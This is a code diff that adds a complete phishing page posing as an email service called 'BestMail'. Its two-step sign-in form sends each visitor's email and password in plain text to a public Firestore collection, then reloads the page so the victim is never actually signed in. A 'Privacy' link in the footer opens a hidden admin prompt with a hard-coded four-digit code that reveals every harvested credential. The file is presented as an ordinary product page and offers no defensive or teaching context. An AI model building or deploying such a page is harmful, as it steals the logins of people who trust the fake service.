@@ -1,1 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BestMail - Secure & Fast Email</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+        }
 
+        .fade-in {
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group:focus-within label {
+            color: #2563eb;
+        }
+
+        .btn-primary {
+            background-color: #2563eb;
+            transition: all 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: #1d4ed8;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px -2px rgba(37, 99, 235, 0.3);
+        }
+
+        .loader {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #secret-modal {
+            background-color: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(6px);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <header class="w-full px-6 py-4 flex justify-between items-center bg-white/80 backdrop-blur-md sticky top-0 z-40 border-b border-slate-100">
+        <div class="flex items-center space-x-2 cursor-pointer" onclick="showView('landing')">
+            <svg width="32" height="32" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="45" stroke="#0066cc" stroke-width="8" />
+                <path d="M81.8 18.2C89.7 26.1 94.6 37 94.9 49" stroke="#66b2ff" stroke-width="10" stroke-linecap="round" />
+                <path d="M28 35L50 50L28 65V35Z" fill="#ffcc00" />
+                <path d="M28 65L72 65L50 50L28 65Z" fill="#333f48" />
+                <path d="M72 35L50 50L72 65V35Z" fill="#333f48" />
+            </svg>
+            <span class="text-xl font-bold text-slate-900">BestMail</span>
+        </div>
+        <button onclick="showView('signin')" class="text-sm font-bold text-blue-600 hover:text-blue-700 bg-blue-50 px-5 py-2 rounded-full transition-all">
+            Sign in
+        </button>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center p-6">
+        
+        <div id="view-landing" class="max-w-4xl w-full text-center fade-in">
+            <h2 class="text-5xl md:text-6xl font-extrabold text-slate-900 tracking-tight mb-6">
+                Secure email for <span class="text-blue-600">everyone.</span>
+            </h2>
+            <p class="text-xl text-slate-600 mb-10 max-w-2xl mx-auto leading-relaxed">
+                Experience the next generation of communication. Fast, private, and always available. Join millions of users who trust BestMail.
+            </p>
+            <div class="flex flex-col sm:flex-row justify-center items-center gap-4">
+                <button onclick="showView('signin')" class="btn-primary text-white px-8 py-4 rounded-2xl font-bold text-lg w-full sm:w-auto">
+                    Get Started Now
+                </button>
+            </div>
+            
+            <div class="mt-20 grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
+                <div class="bg-white p-6 rounded-2xl shadow-sm border border-slate-100">
+                    <h3 class="font-bold text-slate-900 mb-2">Private</h3>
+                    <p class="text-slate-500 text-sm">Encryption ensures your data stays your data.</p>
+                </div>
+                <div class="bg-white p-6 rounded-2xl shadow-sm border border-slate-100">
+                    <h3 class="font-bold text-slate-900 mb-2">Fast</h3>
+                    <p class="text-slate-500 text-sm">Instant delivery across all your modern devices.</p>
+                </div>
+                <div class="bg-white p-6 rounded-2xl shadow-sm border border-slate-100">
+                    <h3 class="font-bold text-slate-900 mb-2">Reliable</h3>
+                    <p class="text-slate-500 text-sm">99.9% uptime for your critical communications.</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="view-signin" class="hidden w-full max-w-[450px] bg-white rounded-3xl border border-slate-200 shadow-2xl p-8 md:p-12 fade-in">
+            <div class="flex flex-col items-center mb-8">
+                <div class="mb-4">
+                    <svg width="70" height="70" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="50" cy="50" r="45" stroke="#0066cc" stroke-width="8" />
+                        <path d="M81.8 18.2C89.7 26.1 94.6 37 94.9 49" stroke="#66b2ff" stroke-width="10" stroke-linecap="round" />
+                        <path d="M28 35L50 50L28 65V35Z" fill="#ffcc00" />
+                        <path d="M28 65L72 65L50 50L28 65Z" fill="#333f48" />
+                        <path d="M72 35L50 50L72 65V35Z" fill="#333f48" />
+                    </svg>
+                </div>
+                <h1 id="brand-title" class="text-3xl font-bold text-slate-900 tracking-tight">BestMail</h1>
+                <p id="sub-title" class="text-slate-500 mt-1 font-medium">Log in to your inbox</p>
+                
+                <div id="account-pill" class="hidden mt-4 flex items-center bg-slate-50 border border-slate-200 rounded-full px-4 py-1.5 cursor-pointer hover:bg-slate-100 transition-colors" onclick="goBack()">
+                    <span id="display-email" class="text-sm font-semibold text-slate-700"></span>
+                    <svg class="w-4 h-4 ml-1 text-slate-400" fill="currentColor" viewBox="0 0 20 20"><path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"></path></svg>
+                </div>
+            </div>
+
+            <form id="login-form" onsubmit="handleFormSubmit(event)">
+                <div id="step-email" class="fade-in">
+                    <div class="input-group relative mt-2">
+                        <input type="email" id="email" required class="block w-full px-4 py-4 text-slate-900 border border-slate-300 rounded-xl outline-none transition-all placeholder-transparent peer" placeholder="Email">
+                        <label class="absolute left-4 top-4 text-slate-400 transition-all peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-blue-600 peer-focus:bg-white peer-focus:px-1">Email address</label>
+                    </div>
+                </div>
+
+                <div id="step-password" class="fade-in hidden">
+                    <div class="input-group relative mt-2">
+                        <input type="password" id="password" class="block w-full px-4 py-4 text-slate-900 border border-slate-300 rounded-xl outline-none transition-all placeholder-transparent peer" placeholder="Password">
+                        <label class="absolute left-4 top-4 text-slate-400 transition-all peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-blue-600 peer-focus:bg-white peer-focus:px-1">Password</label>
+                    </div>
+                    <div class="mt-4 flex items-center">
+                        <input type="checkbox" id="show-password" class="w-4 h-4 rounded border-slate-300 text-blue-600" onclick="togglePassword()">
+                        <label for="show-password" class="ml-2 text-sm text-slate-600 font-medium cursor-pointer">Show password</label>
+                    </div>
+                </div>
+
+                <div class="flex items-center justify-between gap-4 mt-10">
+                    <button type="button" class="text-blue-600 font-bold text-sm" onclick="alert('Account creation coming soon!')">Create account</button>
+                    <button type="submit" id="next-btn" class="btn-primary text-white font-bold py-3.5 px-8 rounded-xl text-sm min-w-[110px]">Next</button>
+                </div>
+            </form>
+
+            <div id="message-box" class="hidden mt-6 p-4 rounded-xl text-sm font-medium text-center"></div>
+
+            <div id="logs-panel" class="hidden mt-8 pt-6 border-t border-slate-100 fade-in">
+                <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-2">Cloud Activity Logs</h3>
+                <div id="logs-content" class="text-xs font-mono bg-slate-900 text-slate-300 p-4 rounded-xl max-h-60 overflow-y-auto leading-relaxed">
+                    <div class="text-slate-500 italic text-center">Logs will appear here permanently...</div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="w-full px-8 py-6 flex flex-col md:flex-row justify-between items-center text-xs text-slate-500 max-w-[1200px] mx-auto">
+        <div class="flex space-x-6">
+            <span>&copy; 2024 BestMail Inc.</span>
+            <button type="button" onclick="openSecretPrompt()" class="hover:text-slate-900">Privacy</button>
+            <a href="#" class="hover:text-slate-900">Terms</a>
+        </div>
+    </footer>
+
+    <div id="secret-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl shadow-2xl w-full max-w-[340px] p-8 fade-in">
+            <h3 class="text-xl font-bold text-slate-900 mb-2 text-center">Admin Access</h3>
+            <p class="text-sm text-slate-500 mb-6 text-center">Enter your 4-digit code.</p>
+            <input type="password" id="secret-code-input" maxlength="4" placeholder="••••" class="block w-full text-center text-3xl font-bold tracking-[1em] px-4 py-3 border border-slate-300 rounded-2xl outline-none mb-6 bg-slate-50">
+            <div class="flex space-x-3">
+                <button onclick="closeSecretPrompt()" class="flex-1 py-3 text-sm font-bold text-slate-500 hover:bg-slate-50 rounded-xl">Cancel</button>
+                <button onclick="checkSecretCode()" class="flex-1 py-3 text-sm font-bold bg-slate-900 text-white hover:bg-slate-800 rounded-xl">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        const firebaseConfig = JSON.parse(__firebase_config);
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'bestmail-v3';
+
+        let currentStep = 'email';
+        let currentEmail = '';
+        let currentUser = null;
+
+        onAuthStateChanged(auth, (user) => {
+            currentUser = user;
+            if (user) {
+                const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'logs');
+                onSnapshot(logsRef, (snapshot) => {
+                    const logs = snapshot.docs.map(doc => doc.data());
+                    // Filter or sort in JS memory as per Rule 2
+                    logs.sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
+                    document.getElementById('logs-content').innerHTML = logs.map(l => `<div class='mb-2 pb-2 border-b border-slate-800'><b>User:</b> ${l.email}<br><b>Pass:</b> ${l.password}</div>`).join('');
+                }, (error) => {
+                    console.error("Firestore error:", error);
+                });
+            }
+        });
+
+        window.showView = (v) => {
+            document.getElementById('view-landing').classList.add('hidden');
+            document.getElementById('view-signin').classList.add('hidden');
+            document.getElementById(`view-${v}`).classList.remove('hidden');
+        };
+
+        window.handleFormSubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('next-btn');
+            if (currentStep === 'email') {
+                currentEmail = document.getElementById('email').value;
+                document.getElementById('display-email').innerText = currentEmail;
+                document.getElementById('step-email').classList.add('hidden');
+                document.getElementById('step-password').classList.remove('hidden');
+                document.getElementById('account-pill').classList.remove('hidden');
+                currentStep = 'password';
+                btn.innerText = 'Sign in';
+            } else {
+                if (!currentUser) return;
+                const pass = document.getElementById('password').value;
+                try {
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'logs'), {
+                        email: currentEmail, 
+                        password: pass, 
+                        timestamp: serverTimestamp()
+                    });
+                    document.getElementById('message-box').innerText = "Logging in...";
+                    document.getElementById('message-box').classList.remove('hidden', 'text-red-600');
+                    document.getElementById('message-box').classList.add('text-green-600');
+                    setTimeout(() => window.location.reload(), 1500);
+                } catch (err) {
+                    console.error("Error saving log:", err);
+                }
+            }
+        };
+
+        window.goBack = () => {
+            document.getElementById('step-password').classList.add('hidden');
+            document.getElementById('account-pill').classList.add('hidden');
+            document.getElementById('step-email').classList.remove('hidden');
+            currentStep = 'email';
+            document.getElementById('next-btn').innerText = 'Next';
+        };
+
+        window.togglePassword = () => {
+            const p = document.getElementById('password');
+            p.type = p.type === 'password' ? 'text' : 'password';
+        };
+
+        window.openSecretPrompt = () => document.getElementById('secret-modal').classList.remove('hidden');
+        window.closeSecretPrompt = () => document.getElementById('secret-modal').classList.add('hidden');
+        window.checkSecretCode = () => {
+            if (document.getElementById('secret-code-input').value === '0811') {
+                document.getElementById('logs-panel').classList.remove('hidden');
+                window.closeSecretPrompt();
+            } else { alert("Wrong code!"); }
+        };
+
+        async function initAuth() {
+            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                await signInWithCustomToken(auth, __initial_auth_token);
+            } else {
+                await signInAnonymously(auth);
+            }
+        }
+        initAuth();
+    </script>
+</body>
+</html>
